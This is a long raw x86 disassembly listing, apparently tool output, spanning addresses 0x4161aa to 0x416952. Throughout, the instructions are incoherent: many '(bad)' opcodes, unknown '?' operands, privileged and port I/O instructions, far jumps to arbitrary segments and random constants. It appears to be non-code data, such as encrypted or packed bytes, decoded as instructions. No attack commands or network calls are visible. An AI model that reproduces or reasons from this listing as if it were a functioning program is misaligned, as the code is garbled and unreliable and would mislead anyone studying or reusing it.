  4161aa:	mov    ecx,0x9f164544
  4161af:	ret    
  4161b0:	push   cs
  4161b1:	xchg   BYTE PTR [ebp+0x51],dh
  4161b4:	mov    edi,ebx
  4161b6:	es pusha 
  4161b8:	sahf   
  4161b9:	mov    WORD PTR [ebx+edi*4-0x141ba452],cs
  4161c0:	jg     0x416198
  4161c2:	push   ds
  4161c3:	and    bh,BYTE PTR [edx-0x4f492502]
  4161c9:	mov    ebp,0x8b0f69c3
  4161ce:	retf   
  4161cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4161d0:	adc    DWORD PTR [ecx+0x1d],esp
  4161d3:	sub    BYTE PTR [esi-0x73],dh
  4161d6:	pop    ebp
  4161d7:	sbb    al,0xd4
  4161d9:	into   
  4161da:	ins    DWORD PTR es:[edi],dx
  4161db:	mov    edi,0x33031951
  4161e0:	fcom   QWORD PTR [edx+0x6d54c1b5]
  4161e6:	jmp    0xde6:0x8fbca917
  4161ed:	retf   
  4161ee:	and    BYTE PTR [esi],al
  4161f0:	aad    0x2c
  4161f2:	pop    ecx
  4161f3:	scas   eax,DWORD PTR es:[edi]
  4161f4:	and    al,0xce
  4161f6:	aad    0x15
  4161f8:	sar    DWORD PTR [edi-0x3dd180b8],cl
  4161fe:	scas   eax,DWORD PTR es:[edi]
  4161ff:	cwde   
  416200:	push   ds
  416201:	jmp    DWORD PTR [esi]
  416203:	cmc    
  416204:	stos   BYTE PTR es:[edi],al
  416205:	pop    ds
  416206:	shl    BYTE PTR [ecx-0x74],0xcb
  41620a:	stos   BYTE PTR es:[edi],al
  41620b:	rol    ebp,0xab
  41620e:	cmp    DWORD PTR [edi-0x4e],0x542f31c9
  416215:	aad    0x81
  416217:	jbe    0x416298
  416219:	add    DWORD PTR [eax],esp
  41621b:	fisttp QWORD PTR [ebx+0x33a09e9c]
  416221:	mov    edi,0x8d0a0782
  416226:	pop    es
  416227:	sub    ecx,esp
  416229:	add    ebx,ebp
  41622b:	dec    esp
  41622c:	mov    ebp,0xf7138fab
  416231:	outs   dx,BYTE PTR ds:[esi]
  416232:	fld    TBYTE PTR [edi+ebp*1+0x47]
  416236:	gs daa 
  416238:	mov    esp,0x1958869d
  41623d:	in     al,dx
  41623e:	mov    ebx,0x8484ecd5
  416243:	ret    
  416244:	fbstp  TBYTE PTR [eax+0x7da5a6ae]
  41624a:	lock dec esp
  41624c:	push   ebx
  41624d:	rcr    ah,cl
  41624f:	es push 0x3c
  416252:	test   BYTE PTR [edi+0x4b],0x67
  416256:	cmp    DWORD PTR [edx+edx*1+0x5a],edi
  41625a:	into   
  41625b:	jge    0x4162be
  41625d:	push   ebx
  41625e:	add    dh,BYTE PTR [esi]
  416260:	or     DWORD PTR [edi],0xffffffff
  416263:	sub    DWORD PTR [eax-0x33da380a],ecx
  416269:	mov    ss,WORD PTR [esp+ecx*4]
  41626c:	mov    bh,0xcd
  41626e:	cwde   
  41626f:	mov    ecx,0x311e3631
  416274:	(bad)  
  416275:	call   0x1914:0xaaecd7ec
  41627c:	out    dx,eax
  41627d:	lahf   
  41627e:	mov    ?,WORD PTR [esp+ebp*4]
  416281:	rcl    ah,0x14
  416284:	enter  0x487f,0xac
  416288:	jecxz  0x41625c
  41628a:	xor    BYTE PTR [edx-0x317a3e8c],bh
  416290:	cmp    dl,bh
  416292:	ins    DWORD PTR es:[edi],dx
  416293:	ss and al,0xce
  416296:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416297:	(bad)  
  416299:	xchg   ebp,eax
  41629a:	adc    esp,edi
  41629c:	aad    0x53
  41629e:	int    0x61
  4162a0:	dec    ecx
  4162a1:	mov    cs,WORD PTR [esp+edx*8+0x4e4abed2]
  4162a8:	adc    al,0x78
  4162aa:	(bad)  
  4162ab:	mov    edx,0x4b3bb097
  4162b0:	pusha  
  4162b1:	pop    es
  4162b2:	xor    ebx,ecx
  4162b4:	or     DWORD PTR [ebx+0x7a3eb296],eax
  4162ba:	sub    eax,esi
  4162bc:	(bad)  
  4162bd:	pop    ecx
  4162be:	in     al,dx
  4162bf:	cmp    ebx,edx
  4162c1:	jl     0x416265
  4162c3:	fxtract 
  4162c5:	xor    dh,BYTE PTR [ebx+0x626f14d3]
  4162cb:	pop    ebx
  4162cc:	and    DWORD PTR [ebx+esi*8],esi
  4162cf:	adc    bl,BYTE PTR [eax+eax*1]
  4162d2:	iret   
  4162d3:	push   esp
  4162d4:	into   
  4162d5:	add    eax,0x8632da87
  4162da:	and    eax,0x8e80fff0
  4162df:	(bad)  
  4162e0:	or     esi,eax
  4162e2:	jg     0x4162da
  4162e4:	ds (bad) 
  4162e6:	mov    WORD PTR [ecx-0xf],fs
  4162e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162ea:	test   al,0xda
  4162ec:	pop    ss
  4162ed:	push   eax
  4162ee:	mov    BYTE PTR [eax-0x76],ch
  4162f1:	dec    ebx
  4162f2:	xchg   DWORD PTR [esi-0xeef194f],esp
  4162f8:	int3   
  4162f9:	or     dh,BYTE PTR [esi+ebx*2+0x44438275]
  416300:	dec    ebx
  416301:	cmp    eax,0x3d8b4b60
  416306:	ror    DWORD PTR [ebp-0x53f5d5ca],cl
  41630c:	sub    esi,ebx
  41630e:	mov    ebx,0x17d87370
  416313:	push   edx
  416314:	push   ebp
  416315:	pop    edx
  416316:	mov    BYTE PTR fs:[ebp+0x45],cl
  41631a:	(bad)  
  41631b:	pop    edx
  41631c:	xor    al,0xd3
  41631e:	or     al,0x78
  416320:	pop    esi
  416321:	mov    ebx,DWORD PTR ss:[ebx+0x2c847b43]
  416328:	mov    ?,ebp
  41632a:	inc    edi
  41632b:	add    DWORD PTR [edx],eax
  41632d:	aam    0x81
  41632f:	and    ebx,DWORD PTR [edx-0x46]
  416332:	out    dx,al
  416333:	ror    BYTE PTR [ecx+0x49d09923],1
  416339:	cmp    DWORD PTR [eax],ecx
  41633b:	jmp    0x1fa:0x61a50d85
  416342:	iret   
  416343:	outs   dx,BYTE PTR ds:[esi]
  416344:	xchg   ebx,eax
  416345:	inc    esp
  416346:	out    dx,al
  416347:	xchg   esp,eax
  416348:	add    DWORD PTR [esi+0x58],esi
  41634b:	test   DWORD PTR [esi],eax
  41634d:	sysret 
  41634f:	xchg   esi,eax
  416350:	sbb    edx,DWORD PTR [ecx+0x422d326]
  416356:	loopne 0x416384
  416358:	enter  0xbf3,0x73
  41635c:	pop    ss
  41635d:	cwde   
  41635e:	mov    dh,0x31
  416360:	xchg   ecx,eax
  416361:	sbb    ch,BYTE PTR [ebx+0xe]
  416364:	mov    bl,0xa4
  416366:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416367:	dec    edx
  416368:	enter  0x93ef,0xcf
  41636c:	mov    cl,0x78
  41636e:	and    ebx,edi
  416370:	xchg   edx,eax
  416371:	xchg   ecx,eax
  416372:	stos   BYTE PTR es:[edi],al
  416373:	push   edi
  416374:	(bad)  
  416375:	shl    esp,cl
  416377:	jmp    0x4163ed
  416379:	mov    eax,ds:0xf00e24f1
  41637e:	jecxz  0x41639c
  416380:	aad    0xbc
  416382:	sbb    DWORD PTR [esi+0xf964fc2],edi
  416388:	retf   0x979f
  41638b:	pop    ds
  41638c:	jae    0x4163cf
  41638e:	mov    edi,0x4c105ddb
  416393:	pop    ecx
  416394:	mov    ch,0x98
  416396:	push   cs
  416397:	inc    ebx
  416398:	push   ss
  416399:	adc    edi,DWORD PTR [ecx+0x60ea3ade]
  41639f:	mov    bl,0x9f
  4163a1:	inc    ecx
  4163a2:	rcl    BYTE PTR [edx+0x32],0x19
  4163a6:	nop
  4163a7:	ds ins BYTE PTR es:[edi],dx
  4163a9:	mov    esi,0xe3bfc130
  4163ae:	(bad)
  4163b2:	lods   eax,DWORD PTR ds:[esi]
  4163b3:	jl     0x4163b9
  4163b5:	out    0xad,eax
  4163b7:	jecxz  0x4163fd
  4163b9:	jo     0x41633d
  4163bb:	jl     0x41639b
  4163bd:	mov    eax,ds:0x9b514ec7
  4163c2:	(bad)  
  4163c3:	xchg   esp,eax
  4163c4:	jle    0x416350
  4163c6:	je     0x416428
  4163c8:	xchg   edx,eax
  4163c9:	adc    ch,ah
  4163cb:	iret   
  4163cc:	je     0x41638e
  4163ce:	xchg   edx,eax
  4163cf:	nop
  4163d0:	ja     0x416385
  4163d2:	xor    DWORD PTR [eax+ecx*8+0x13],esp
  4163d6:	and    DWORD PTR [edi-0x1e],0xb156773
  4163dd:	rcl    DWORD PTR [ebx],cl
  4163df:	inc    esp
  4163e0:	or     edx,DWORD PTR [esi+0x30]
  4163e3:	lock das 
  4163e5:	mov    ds,WORD PTR [ebx]
  4163e7:	pop    ebx
  4163e8:	icebp  
  4163e9:	stos   DWORD PTR es:[edi],eax
  4163ea:	(bad)  
  4163eb:	iret   
  4163ec:	jmp    0x4163b7
  4163ee:	cmp    DWORD PTR [esi+0xb],esi
  4163f1:	std    
  4163f2:	lods   eax,DWORD PTR ds:[esi]
  4163f3:	pop    ss
  4163f4:	mov    ebx,0xba064a31
  4163f9:	push   0xffffffdf
  4163fb:	xor    al,BYTE PTR [edx-0x1b47d1aa]
  416401:	or     al,0x14
  416403:	sbb    DWORD PTR [ebx-0x79],ebx
  416406:	adc    ebp,DWORD PTR fs:[ebx]
  416409:	ss inc edx
  41640b:	sbb    al,0xa2
  41640d:	stos   BYTE PTR es:[edi],al
  41640e:	lock dec edx
  416410:	enter  0xb310,0x7d
  416414:	iret   
  416415:	cmp    eax,0xd2c4b689
  41641a:	jno    0x4163f9
  41641c:	mov    esp,eax
  41641e:	(bad)  
  41641f:	mov    ah,0x7e
  416421:	pop    eax
  416422:	addr16 call 0xcf66:0x730cd0c0
  41642a:	sub    edi,DWORD PTR [edi+0x12]
  41642d:	lds    ebp,FWORD PTR [ebp+0x7019e487]
  416433:	outs   dx,BYTE PTR ds:[esi]
  416434:	push   cs
  416435:	pushf  
  416436:	dec    esp
  416437:	xchg   edx,eax
  416438:	add    ebx,DWORD PTR [ebx]
  41643a:	not    BYTE PTR [eax]
  41643c:	mov    ch,0x68
  41643e:	xchg   ecx,eax
  41643f:	mov    ds:0xa8bd7274,al
  416444:	adc    bh,BYTE PTR [edx-0x3c]
  416447:	sbb    ebp,DWORD PTR [edx+0x7fe3f010]
  41644d:	jp     0x4164b0
  41644f:	pop    edi
  416450:	dec    ebp
  416451:	ret    0x7628
  416454:	sahf   
  416455:	pusha  
  416456:	xor    edi,ecx
  416458:	add    dl,BYTE PTR [eax]
  41645a:	or     eax,edi
  41645c:	fdivr  DWORD PTR [ecx-0x47]
  41645f:	pop    es
  416460:	das    
  416461:	test   ebp,ebp
  416463:	ret    
  416464:	cdq    
  416465:	mov    ch,0x81
  416467:	jle    0x416410
  416469:	cli    
  41646a:	mov    ds:0x589f50b4,al
  41646f:	icebp  
  416470:	loop   0x41647c
  416472:	daa    
  416473:	dec    ebx
  416474:	sahf   
  416475:	pusha  
  416476:	pop    eax
  416477:	repnz cmp al,0x6a
  41647a:	sti    
  41647b:	scas   eax,DWORD PTR es:[edi]
  41647c:	push   ecx
  41647d:	pushf  
  41647e:	mov    ?,eax
  416480:	cdq    
  416481:	xor    bl,dl
  416483:	jno    0x416429
  416485:	rol    edi,0x1a
  416488:	mov    ds:0xe1f55402,eax
  41648d:	retf   
  41648e:	test   eax,0x8a5a2880
  416493:	ja     0x416477
  416495:	scas   al,BYTE PTR es:[edi]
  416496:	lahf   
  416497:	push   eax
  416498:	inc    ecx
  416499:	das    
  41649a:	fcmovu st,st(3)
  41649c:	clc    
  41649d:	mov    eax,ds:0xb4d4ccc9
  4164a2:	mov    al,0xce
  4164a4:	ja     0x4164b4
  4164a6:	sbb    al,0xf5
  4164a8:	cmp    al,0x47
  4164aa:	or     DWORD PTR [bx+si-0x43a2],esi
  4164af:	adc    al,0x67
  4164b1:	mov    ebx,0xcd7da094
  4164b6:	cmp    BYTE PTR [edi+eax*2],bh
  4164b9:	adc    DWORD PTR cs:[ecx+0x29],edx
  4164bd:	sub    eax,esi
  4164bf:	jae    0x416447
  4164c1:	lahf   
  4164c2:	and    dl,BYTE PTR [eax+0x26bdd023]
  4164c8:	add    al,0xa
  4164ca:	cdq    
  4164cb:	retf   0xee92
  4164ce:	mov    ebx,DWORD PTR [ecx]
  4164d0:	mov    edx,0x8526aeae
  4164d5:	xor    eax,0x400d7929
  4164da:	call   0xdefc20df
  4164df:	pop    ss
  4164e0:	dec    ebx
  4164e1:	inc    ebx
  4164e2:	inc    ebx
  4164e3:	mov    bl,bl
  4164e5:	dec    ebp
  4164e6:	cmp    eax,edi
  4164e8:	pop    ebp
  4164e9:	iret   
  4164ea:	sti    
  4164eb:	mov    ebp,0x58d1c71a
  4164f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4164f1:	push   esi
  4164f2:	outs   dx,BYTE PTR ds:[esi]
  4164f3:	loopne 0x416545
  4164f5:	dec    ebx
  4164f6:	jns    0x4164cf
  4164f8:	imul   DWORD PTR [ebp+0x427ad69b]
  4164fe:	inc    ebx
  4164ff:	inc    edi
  416500:	ficom  WORD PTR [edx+0x6c]
  416503:	mov    eax,0xf708971d
  416508:	jg     0x4164d5
  41650a:	jge    0x4164ce
  41650c:	jecxz  0x41650a
  41650e:	data16 fiadd DWORD PTR ds:[eax+0x6fe3f6b4]
  416516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416517:	dec    esp
  416518:	adc    eax,0xe2da271f
  41651d:	pop    ecx
  41651e:	test   al,0x48
  416520:	test   eax,0x8ffbcfa3
  416525:	adc    al,BYTE PTR [edi+esi*8]
  416528:	ins    BYTE PTR es:[edi],dx
  416529:	cs ret 
  41652b:	add    esi,DWORD PTR [eax+0x2d]
  41652e:	adc    dh,BYTE PTR [ebx-0x4d]
  416531:	xor    BYTE PTR [esi+ebp*4+0x1b57712b],ah
  416538:	sub    ch,BYTE PTR [ebx]
  41653a:	cmp    al,0x14
  41653c:	xchg   edx,eax
  41653d:	sbb    esi,0x10
  416540:	mov    esp,0x5c83c360
  416545:	lock jne 0x416534
  416548:	sti    
  416549:	jmp    0x416572
  41654b:	test   BYTE PTR [ebx+0x39666a94],0x4b
  416552:	cmp    cl,BYTE PTR [edi+0x7c62b71f]
  416558:	sub    eax,0x802096cf
  41655d:	in     al,0xb0
  41655f:	loope  0x4165a8
  416561:	test   eax,0x898c6e70
  416566:	xor    BYTE PTR [edx+eiz*8+0x31],ah
  41656a:	pop    ebx
  41656b:	pop    ecx
  41656c:	std    
  41656d:	add    eax,0xa517f2ca
  416572:	or     cl,BYTE PTR [esi-0x4cd8cfd6]
  416578:	push   0xc217be9a
  41657d:	pop    ds
  41657e:	arpl   bp,bp
  416580:	add    BYTE PTR [ecx],0x70
  416583:	clc    
  416584:	xchg   ebp,eax
  416585:	inc    esp
  416586:	cmp    DWORD PTR [ebp+0x74],esi
  416589:	mov    dh,0x85
  41658b:	xor    DWORD PTR [edi+0x69],edi
  41658e:	jns    0x4165fb
  416590:	or     al,0x1c
  416592:	(bad)  
  416593:	ror    edx,cl
  416595:	cmp    DWORD PTR [ebx+0x45],esi
  416598:	gs push ebp
  41659a:	add    cl,ch
  41659c:	jae    0x416538
  41659e:	sub    dl,dl
  4165a0:	retf   
  4165a1:	call   0x40d4b56
  4165a6:	(bad)  
  4165a7:	and    ah,ch
  4165a9:	mov    al,0x8f
  4165ab:	sbb    al,0xbc
  4165ad:	adc    eax,0xe158b7f7
  4165b2:	and    BYTE PTR [eax+0x23],0x87
  4165b6:	stos   BYTE PTR es:[edi],al
  4165b7:	psrlq  mm5,mm7
  4165ba:	mov    DWORD PTR [ebx],ebp
  4165bc:	mov    BYTE PTR ds:0x4b1ba0e2,0xe6
  4165c3:	xchg   ecx,eax
  4165c4:	aaa    
  4165c5:	pop    esp
  4165c6:	ret    
  4165c7:	adc    al,0x62
  4165c9:	rol    dl,0xed
  4165cc:	ds ja  0x41656b
  4165cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165d0:	test   al,0x92
  4165d2:	mov    ecx,0xec8f4cd3
  4165d7:	jbe    0x41663d
  4165d9:	daa    
  4165da:	or     dl,BYTE PTR [ecx+0x7225d743]
  4165e0:	aam    0x32
  4165e2:	push   cs
  4165e3:	scas   al,BYTE PTR es:[edi]
  4165e4:	add    al,0x2a
  4165e6:	rcl    BYTE PTR [ecx+0x1b],0x2c
  4165ea:	and    DWORD PTR [eax+0x77426363],esp
  4165f0:	jle    0x41662a
  4165f2:	jmp    0x416654
  4165f4:	inc    edx
  4165f5:	push   esi
  4165f6:	pushf  
  4165f7:	stos   BYTE PTR es:[di],al
  4165f9:	and    al,0x92
  4165fb:	rcl    dh,cl
  4165fd:	loope  0x416637
  4165ff:	lea    ecx,[edi+0x1a]
  416602:	stos   DWORD PTR es:[edi],eax
  416603:	bound  edi,QWORD PTR [edi+edx*1]
  416606:	fsubr  DWORD PTR [esi-0x4f]
  416609:	out    0xcd,al
  41660b:	mov    ecx,0x9c94fe71
  416610:	dec    eax
  416611:	cli    
  416612:	enter  0x37c1,0x71
  416616:	mov    bh,0x33
  416618:	(bad)  
  416619:	sbb    ebx,ebx
  41661b:	cli    
  41661c:	pop    esi
  41661d:	dec    edi
  41661e:	fild   DWORD PTR [ebx]
  416620:	sub    ch,BYTE PTR [ebx-0x6b8f959c]
  416626:	push   cs
  416627:	lods   al,BYTE PTR ds:[esi]
  416628:	and    ah,ah
  41662a:	pop    es
  41662b:	jge    0x4165e1
  41662d:	in     eax,0x60
  41662f:	test   eax,0xcc692a93
  416634:	aas    
  416635:	outs   dx,DWORD PTR ds:[esi]
  416636:	adc    ecx,edi
  416638:	std    
  416639:	ss inc edi
  41663b:	lahf   
  41663c:	pop    esi
  41663d:	js     0x4165d2
  41663f:	sbb    eax,DWORD PTR [edi]
  416641:	or     BYTE PTR [eax],ah
  416643:	cmp    DWORD PTR [esi],ebx
  416645:	lods   eax,DWORD PTR ds:[esi]
  416646:	mov    ebp,0xca1540de
  41664b:	push   cs
  41664c:	(bad)
  41664f:	xchg   esp,eax
  416650:	and    ebx,DWORD PTR [ebp+0x51]
  416653:	(bad)  
  416654:	ficom  WORD PTR [eax-0x54]
  416657:	cmp    ebx,edi
  416659:	fsubr  st,st(3)
  41665b:	push   cs
  41665c:	lahf   
  41665d:	inc    BYTE PTR gs:[ecx]
  416660:	push   ss
  416661:	lods   al,BYTE PTR ds:[esi]
  416662:	shl    ecx,cl
  416664:	sar    BYTE PTR [edi-0x63],1
  416667:	mov    ds:0xb24b72e1,al
  41666c:	or     al,0xa7
  41666e:	inc    ecx
  41666f:	addr16 leave 
  416671:	jne    0x416643
  416673:	xor    eax,0x4f58f766
  416678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416679:	and    al,BYTE PTR [esp+esi*4]
  41667c:	test   BYTE PTR [ebx],dh
  41667e:	sbb    al,0x97
  416680:	cld    
  416681:	cmp    bh,BYTE PTR [edi-0x28]
  416684:	retf   0x6dc9
  416687:	add    BYTE PTR [edi-0x682b0b3a],0xcc
  41668e:	jle    0x4166bb
  416690:	repnz stos DWORD PTR es:[edi],eax
  416692:	aad    0x47
  416694:	pop    ebx
  416695:	jmp    0x8b0bcfd1
  41669a:	sub    DWORD PTR [esi-0x13],ecx
  41669d:	jne    0x4166ee
  41669f:	fisttp DWORD PTR [ebx]
  4166a1:	push   cs
  4166a2:	xor    al,BYTE PTR [ecx+0x4c]
  4166a5:	mov    esi,ebx
  4166a7:	icebp  
  4166a8:	shl    DWORD PTR [ebp+0x46],0x9c
  4166ac:	retf   0x763a
  4166af:	int3   
  4166b0:	jmp    0x747df3
  4166b5:	shr    BYTE PTR [edi+0x71],1
  4166b8:	fnstsw WORD PTR ds:0x27115c99
  4166be:	inc    ebp
  4166bf:	(bad)  
  4166c0:	pop    eax
  4166c1:	jno    0x4166e6
  4166c3:	sub    edx,edi
  4166c5:	push   0x53
  4166c7:	rcr    DWORD PTR [esi-0x4a],0x9b
  4166cb:	retf   0x4c27
  4166ce:	mov    ch,BYTE PTR [esi-0xb]
  4166d1:	(bad)  
  4166d2:	int3   
  4166d3:	pop    ss
  4166d4:	dec    eax
  4166d5:	test   eax,0xe5c9123a
  4166da:	rol    DWORD PTR [edx],cl
  4166dc:	and    al,0xef
  4166de:	dec    ebx
  4166df:	sub    BYTE PTR [ebp-0x3c6b41cb],ah
  4166e5:	sbb    al,0x5c
  4166e7:	fadd   QWORD PTR [esi+0x40bdcfaa]
  4166ed:	inc    edi
  4166ee:	cmp    esp,DWORD PTR [ecx]
  4166f0:	shl    ecx,1
  4166f2:	shl    DWORD PTR [eax],cl
  4166f4:	sbb    eax,DWORD PTR [eax+0x6cc7f098]
  4166fa:	fsubr  DWORD PTR [esi-0x7215bc35]
  416700:	fst    QWORD PTR [ebx-0x46]
  416703:	je     0x4166d0
  416705:	arpl   WORD PTR [edi],si
  416707:	sub    ecx,DWORD PTR [ebx-0x4d]
  41670a:	xchg   esi,eax
  41670b:	push   ds
  41670c:	js     0x416774
  41670e:	je     0x4166ec
  416710:	loopne 0x4166ea
  416712:	pushf  
  416713:	out    dx,al
  416714:	fist   WORD PTR [esi]
  416716:	fs sti 
  416718:	mov    WORD PTR [eax-0x182d616a],?
  41671e:	test   al,0x7c
  416720:	push   ebx
  416721:	inc    ecx
  416722:	into   
  416723:	shl    DWORD PTR [eax],cl
  416725:	lea    ebx,[esi]
  416727:	inc    ebx
  416728:	mov    esp,esi
  41672a:	and    eax,0x295aa245
  41672f:	add    DWORD PTR [eax+0x1d],ebp
  416732:	(bad)  
  416733:	es test al,0xe7
  416736:	lahf   
  416737:	jge    0x4166f0
  416739:	retf   0x781d
  41673c:	fsubr  st(6),st
  41673e:	xchg   ecx,eax
  41673f:	scas   eax,DWORD PTR es:[edi]
  416740:	jecxz  0x4167ac
  416742:	pop    ds
  416743:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416744:	xchg   ebx,eax
  416745:	fincstp 
  416747:	(bad)  
  416748:	lods   eax,DWORD PTR ds:[esi]
  416749:	jns    0x416793
  41674b:	inc    ebx
  41674c:	adc    BYTE PTR [ebp-0x51cb86fd],dh
  416752:	mov    dl,0x1b
  416754:	jns    0x4166fe
  416756:	sbb    BYTE PTR [ebx],cl
  416758:	ror    DWORD PTR [edi],1
  41675a:	cwde   
  41675b:	in     al,dx
  41675c:	pushf  
  41675d:	ins    DWORD PTR es:[edi],dx
  41675e:	fcom   QWORD PTR [ebx]
  416760:	sub    eax,0x7344b269
  416765:	iret   
  416766:	nop
  416767:	stos   DWORD PTR es:[edi],eax
  416768:	aad    0xe1
  41676a:	inc    ebx
  41676b:	retf   
  41676c:	mov    ds:0xc21f885a,al
  416771:	push   0xfffffff7
  416773:	sub    eax,0x95ca359d
  416778:	and    al,0x2f
  41677a:	cwde   
  41677b:	jecxz  0x416792
  41677d:	mov    ebx,0x7b216aa0
  416783:	cwde   
  416784:	mov    dh,dh
  416786:	jmp    0x4167c1
  416788:	push   edx
  416789:	push   0xffffffcf
  41678b:	retf   0x97f8
  41678e:	pop    eax
  41678f:	enter  0x2f09,0x3
  416793:	into   
  416794:	fcmovnu st,st(1)
  416796:	pop    esi
  416797:	arpl   WORD PTR [ebx-0x6279ef7c],cx
  41679d:	lods   eax,DWORD PTR ds:[esi]
  41679e:	push   0x15
  4167a0:	leave  
  4167a1:	ins    BYTE PTR es:[edi],dx
  4167a2:	es push ebx
  4167a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167a5:	or     eax,0x172ffc2b
  4167aa:	mov    ecx,0xcf66b1c5
  4167af:	pop    ds
  4167b0:	jns    0x4167cd
  4167b2:	es sti 
  4167b4:	mov    ecx,0xf760ded1
  4167b9:	mov    BYTE PTR [ebp-0x5018d7f5],dl
  4167bf:	mov    edi,0xc035eb03
  4167c4:	inc    esi
  4167c5:	add    dh,dl
  4167c7:	clc    
  4167c8:	xchg   esi,eax
  4167c9:	aaa    
  4167ca:	cmp    ebp,esi
  4167cc:	nop
  4167cd:	adc    al,0xb8
  4167cf:	jb     0x41679a
  4167d1:	or     DWORD PTR ds:0xecaa3ac1,esp
  4167d7:	jb     0x4167ee
  4167d9:	lock pushf 
  4167db:	or     eax,0xc677e823
  4167e0:	xor    eax,0x24a1b381
  4167e5:	xor    al,0x77
  4167e7:	iret   
  4167e8:	call   0x67c0:0xee1f349d
  4167ef:	icebp  
  4167f0:	xchg   ebp,eax
  4167f1:	xor    bl,0xf8
  4167f4:	ss xor al,0xbe
  4167f7:	jb     0x416831
  4167f9:	jnp    0x4167b1
  4167fb:	jl     0x41685e
  4167fd:	xlat   BYTE PTR ds:[ebx]
  4167fe:	push   0xffffffa1
  416800:	push   ebx
  416801:	mov    esp,0x1d1a3412
  416806:	and    eax,0xbbf2fa18
  41680b:	fwait
  41680c:	dec    edx
  41680d:	mov    eax,ds:0xec51efbd
  416812:	(bad)  
  416813:	cmp    esi,ecx
  416815:	jmp    0xd874fef8
  41681a:	dec    esi
  41681b:	stos   BYTE PTR es:[edi],al
  41681c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41681d:	nop
  41681e:	sub    dl,BYTE PTR [edi-0x62]
  416821:	push   ebp
  416822:	enter  0xd782,0x37
  416826:	inc    ebp
  416827:	outs   dx,BYTE PTR ds:[esi]
  416828:	fxam   
  41682a:	cli    
  41682b:	(bad)  
  41682d:	dec    ebp
  41682e:	add    DWORD PTR [ecx+0x67],edi
  416831:	in     al,dx
  416832:	dec    BYTE PTR [eax-0x6d]
  416835:	mov    bh,0x7b
  416837:	addr16 call 0x8198367d
  41683d:	in     eax,0x56
  41683f:	push   ebx
  416840:	and    eax,eax
  416842:	jo     0x416885
  416844:	aad    0x12
  416846:	xchg   ebx,eax
  416847:	clc    
  416848:	xor    eax,0x27f2833b
  41684d:	sahf   
  41684e:	pushf  
  41684f:	jbe    0x4168a9
  416851:	jp     0x416882
  416853:	jge    0x41682a
  416855:	scas   eax,DWORD PTR es:[edi]
  416856:	add    edi,ebx
  416858:	sub    al,0x10
  41685a:	pop    esp
  41685b:	and    DWORD PTR [eax],esp
  41685d:	stc    
  41685e:	ret    0x7666
  416861:	inc    ebp
  416862:	fidivr DWORD PTR [eax-0x77]
  416865:	and    DWORD PTR [edx+0x30cc4f48],ecx
  41686b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41686c:	mov    dh,0xcd
  41686e:	pusha  
  41686f:	rcl    BYTE PTR [edi-0x56],0x6f
  416873:	retf   
  416874:	cld    
  416875:	mov    bh,0x25
  416877:	stos   DWORD PTR es:[edi],eax
  416878:	icebp  
  416879:	retf   0x1732
  41687c:	cmp    ah,BYTE PTR [esi]
  41687e:	xor    ch,cl
  416880:	mov    ch,0xc3
  416882:	pop    esi
  416883:	jae    0x4168b8
  416885:	dec    ecx
  416886:	xchg   esi,eax
  416887:	retf   
  416888:	out    0x8b,eax
  41688a:	pop    esp
  41688b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41688c:	mov    ebx,0x94032c78
  416891:	out    0xf,al
  416893:	lods   eax,DWORD PTR ds:[esi]
  416894:	adc    dh,BYTE PTR [edx]
  416896:	sub    ebp,ebx
  416898:	pushf  
  416899:	add    eax,0x9bbd6f74
  41689e:	sbb    ch,BYTE PTR [ebp+edx*4-0x742307e8]
  4168a5:	mov    dl,0x78
  4168a7:	sti    
  4168a8:	jmp    0x5335:0xffcce5bc
  4168af:	in     eax,0xb4
  4168b1:	out    0xd2,eax
  4168b3:	out    0x14,eax
  4168b5:	mov    WORD PTR [edi],es
  4168b7:	push   edx
  4168b8:	sub    DWORD PTR ss:[edi+0x427cd14a],0xfffffff0
  4168c0:	adc    ch,BYTE PTR [edx]
  4168c2:	rcr    ah,0x9a
  4168c5:	ficomp DWORD PTR [ebp+eiz*2-0x69e327af]
  4168cc:	fwait
  4168cd:	repz ror DWORD PTR [edx-0x2f60653d],1
  4168d4:	rol    BYTE PTR [edi+0x56],cl
  4168d7:	sbb    dl,BYTE PTR [ebx-0x2292c2a]
  4168dd:	push   es
  4168de:	push   esi
  4168df:	pop    ss
  4168e0:	loope  0x416930
  4168e2:	push   cs
  4168e3:	retf   
  4168e4:	push   ds
  4168e5:	mov    dl,0x4d
  4168e7:	add    DWORD PTR [esi-0x3275577d],ebp
  4168ed:	shr    DWORD PTR [edi],cl
  4168ef:	(bad)  
  4168f0:	mov    WORD PTR [ecx-0x3b],?
  4168f3:	adc    cx,WORD PTR [edx-0x73]
  4168f7:	ds mov al,0x3
  4168fa:	sub    eax,0x456ccda6
  4168ff:	jno    0x416963
  416901:	jno    0x4168cb
  416903:	jo     0x416903
  416905:	pop    esi
  416906:	sbb    al,0xc4
  416908:	in     eax,dx
  416909:	sbb    edx,esp
  41690b:	mov    ebx,0x9fcb67f8
  416910:	sub    al,0x39
  416912:	cmp    BYTE PTR [esi+0x8],ah
  416915:	js     0x4168e0
  416917:	les    edi,FWORD PTR [ecx+ebp*4+0x1777e513]
  41691e:	mov    ds:0x9451ce2a,eax
  416923:	or     ebx,edi
  416925:	adc    eax,DWORD PTR [edx]
  416927:	sub    ch,BYTE PTR [edx-0xf]
  41692a:	jnp    0x416929
  41692c:	retf   0xf695
  41692f:	mov    edx,0x80b889a4
  416934:	inc    ebx
  416935:	pop    ds
  416936:	cs sub eax,0xf748b91a
  41693c:	lea    esi,[ebx]
  41693e:	jmp    0xfbd64857
  416943:	mov    ax,0x83db
  416947:	sub    al,0x85
  416949:	and    bh,BYTE PTR [ebx]
  41694b:	add    eax,DWORD PTR [ebp+eiz*8+0x36d5569d]
  416952:	xor    ebx,0x200cac79
